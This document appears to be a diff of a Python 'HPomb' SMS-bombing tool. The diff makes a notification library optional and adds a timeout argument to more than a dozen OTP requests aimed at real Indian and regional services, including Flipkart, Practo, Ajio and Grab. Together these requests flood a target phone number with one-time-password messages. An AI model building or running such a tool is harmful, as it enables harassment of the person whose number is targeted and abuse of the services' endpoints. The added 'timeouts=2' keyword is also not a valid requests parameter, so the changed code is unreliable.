@@ -12,37 +12,55 @@ import urllib.request
 import urllib.parse
 import subprocess
 import webbrowser
-import notify2
+
 Red = '\033[1;31m'
 Blue= '\033[1;36m'
 Endc = '\033[0m'
 
+typemassage = 00
 
-def notice():
-    try:
-        notify2.init('HPomb Tool')
-        n = notify2.Notification("HPomb Tool",
-                                 "Bombing Start",
-                                 ""
-                                )
-        n.show()
-        n.timeout = 100000
-        print("\a")
-    except:
-        print("Sorry Notification Feature Not For You")
+try:
+        import notify2
+        typemassage  = 1
+except :
+    typemassage  = 0
 
-def noticeS():
-    try:
-        notify2.init('HPomb Tool')
-        n = notify2.Notification("HPomb Tool",
-                                 "SMS Bombing Start",
-                                 ""
-                                )
-        n.show()
-        n.timeout = 100000
-        print("\a")
-    except:
-        print("Sorry Notification Feature Not For You")
+if typemassage  == 0 :
+        def notice():
+            pass
+        def noticeS():
+            pass
+else:
+    def notice():
+        try:
+            notify2.init('HPomb Tool')
+            n = notify2.Notification("HPomb Tool",
+                                    "Bombing Start",
+                                    ""
+                                    )
+            n.show()
+            n.timeout = 100000
+            print("\a")
+        except:
+            print("Sorry Notification Feature Not For You")
+
+    def noticeS():
+        try:
+            notify2.init('HPomb Tool')
+            n = notify2.Notification("HPomb Tool",
+                                    "SMS Bombing Start",
+                                    ""
+                                    )
+            n.show()
+            n.timeout = 100000
+            print("\a")
+        except:
+            print("Sorry Notification Feature Not For You")
+
+
+
+
+
 
 
 
@@ -365,7 +383,7 @@ def getapi(pn, lim, cc):
           'uniq_identy': 'quWqfunF',
           'forget_pwd': 'N'
         }
-        response = requests.post('https://m.netmeds.com/sociallogin/popup/nmsgetcode/', headers=headers, data=data)
+        response = requests.post('https://m.netmeds.com/sociallogin/popup/nmsgetcode/', headers=headers, data=data , timeouts=2)
         return True
     elif lim == 4:
         headers = {
@@ -382,7 +400,7 @@ def getapi(pn, lim, cc):
 
         data = {"email":"fakeemail@gmail.com","phone_number":pn,"country_code":cc}
 
-        response = requests.post('https://client-api.goomo.com/v2/phone_confirmation/verify_user', headers=headers, json=data)
+        response = requests.post('https://client-api.goomo.com/v2/phone_confirmation/verify_user', headers=headers, json=data ,timeouts=2)
         return True
     elif lim == 5:
         headers = {
@@ -399,7 +417,7 @@ def getapi(pn, lim, cc):
 
         data = {'countrycode': cc, 'mobileno': pn}
 
-        response = requests.post('https://www.oriyamatrimony.com/login/mobileappsms-homepage.php', headers=headers, data=data)
+        response = requests.post('https://www.oriyamatrimony.com/login/mobileappsms-homepage.php', headers=headers, data=data,timeouts=2)
         return True
     elif lim == 6:
         headers = {
@@ -416,7 +434,7 @@ def getapi(pn, lim, cc):
 
         data = {"loginId":["+"+cc+pn],"supportAllStates":true}
 
-        response = requests.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data)
+        response = requests.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data,timeouts=2)
         return True
     elif lim == 7:
         cookies = {
@@ -453,7 +471,7 @@ def getapi(pn, lim, cc):
           'churnEmailRequest': 'false'
         }
 
-        response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
+        response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data,timeouts=2)
         return True
 
     elif lim == 8:
@@ -476,7 +494,7 @@ def getapi(pn, lim, cc):
           'undefined': ''
         }
 
-        response = requests.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data)
+        response = requests.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data,timeouts=2)
         return True
     elif lim == 9:
 
@@ -498,7 +516,7 @@ def getapi(pn, lim, cc):
           'mobile': '+'+cc+91,
           'fingerprint': '',
           'device_name':'samsung+SM-G9350'}
-        response = requests.post( "https://accounts.practo.com/send_otp", headers=headers, data=data)
+        response = requests.post( "https://accounts.practo.com/send_otp", headers=headers, data=data,timeouts=2)
         rd=response.text
         # rd = os.popen('curl -s -X POST -H "X-DROID-VERSION:4.12.5" -H "API-Version:2.0" -H "user-agent:samsung SM-G9350 0 4.4.2" -H "client-version:Android-4.12.5" -H "X-DROID-VERSION-CODE:158" -H "Accept:application/json" -H "client-name:Practo Android App" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:accounts.practo.com" -H "Connection:Keep-Alive" -H "Content-Length:96" -d  "client_name=Practo+Android+App&fingerprint=&mobile=%2B' + cc + pn + '&device_name=samsung+SM-G9350&"  "https://accounts.practo.com/send_otp"').read()
         return rd.find("success") != -1
@@ -521,7 +539,7 @@ def getapi(pn, lim, cc):
             'cookie': 'AKA_A2=A'}
         data = {"customer":{"MobileNo":pn,"UserName":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}
 
-        response = requests.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, data=data)
+        response = requests.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, data=data,timeouts=2)
         return True
     elif lim == 11:
         headers = {
@@ -538,7 +556,7 @@ def getapi(pn, lim, cc):
 
         data = {'mbl': pn}
 
-        response = requests.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data)
+        response = requests.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data,timeouts=2)
         return True
     elif lim == 12:
         headers = {
@@ -557,7 +575,7 @@ def getapi(pn, lim, cc):
 
         data = {'mobile': pn}
 
-        response = requests.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data)
+        response = requests.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data,timeouts=2)
         rd=response.text
         return rd.find("sent") != -1
     elif lim == 13:
@@ -595,7 +613,7 @@ def getapi(pn, lim, cc):
 
         data = {"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"0000","requestType":"SENDOTP"}
 
-        response = requests.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, cookies=cookies, json=data)
+        response = requests.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, cookies=cookies, json=data,timeouts=2)
         rd=response.text
         if rd.find("\"statusCode\":\"1\"") != -1:
             return True
@@ -619,7 +637,7 @@ def getapi(pn, lim, cc):
 
         data = {"country_code":cc,"phone_number":pn}
 
-        response = requests.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data)
+        response = requests.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data,timeouts=2)
         rd=response.text
         return rd == '24f467b24087ff48c96321786d89c69f'
     elif lim == 15:
@@ -651,7 +669,7 @@ def getapi(pn, lim, cc):
           'lastname': 'Pots'
         }
 
-        response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
+        response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data,timeouts=2)
         rd=response.text
         return rd.find('code:') != -1
     elif lim == 16:
@@ -663,7 +681,7 @@ def getapi(pn, lim, cc):
           'templateID': 'pax_android_production'
         }
 
-        response = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=data)
+        response = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=data,timeouts=2)
         return True
 
     elif lim == 100:
